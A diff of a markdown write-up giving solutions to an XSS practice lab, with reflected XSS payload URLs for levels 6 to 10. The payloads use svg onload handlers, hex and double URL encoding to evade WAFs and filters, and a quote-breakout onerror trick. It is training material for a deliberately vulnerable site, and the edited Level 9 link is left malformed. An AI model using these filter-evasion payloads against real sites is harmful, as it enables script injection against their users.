@@ -12,7 +12,6 @@ Level 6: https://zixem.altervista.org/XSS/6.php?name=\x3Csvg/onload=alert(1337)\
 These can be used to bypass WAFs or XSS filters by encoding < and > in attack payloads. \
 Level 7 : https://zixem.altervista.org/XSS/7.php?name=zxm%253Cscript%253Ealert(1337)%253C/script%253E \
 Double encode < (%253C) and (%253E)> for use in an XSS payload, need to encode them twice using URL encoding \
-Level 8 : \ 
-Level 9 :[https://zixem.altervista.org/XSS/9.php?name=zxm<svg/onload=alert(1337)>](https://zixem.altervista.org/XSS/9.php?name=zxm%3Csvg/onload=%22alert(1337)%22%3E) or [http://zixem.altervista.org/XSS/9.php?name=zxm<SVg/onload=confirm(1337)>](http://zixem.altervista.org/XSS/9.php?name=zxm<SVg/onload=confirm(1337)>) \
+Level 9 :https://zixem.altervista.org/XSS/9.php?name=zxm<svg/onload=alert(1337)>](https://zixem.altervista.org/XSS/9.php?name=zxm%3Csvg/onload=%22alert(1337)%22%3E) or [http://zixem.altervista.org/XSS/9.php?name=zxm<SVg/onload=confirm(1337)>](http://zixem.altervista.org/XSS/9.php?name=zxm<SVg/onload=confirm(1337)>) \
 Level 10 :`http://zixem.altervista.org/XSS/10.php?name=zxm');onerror=confirm`1337`;//`
 
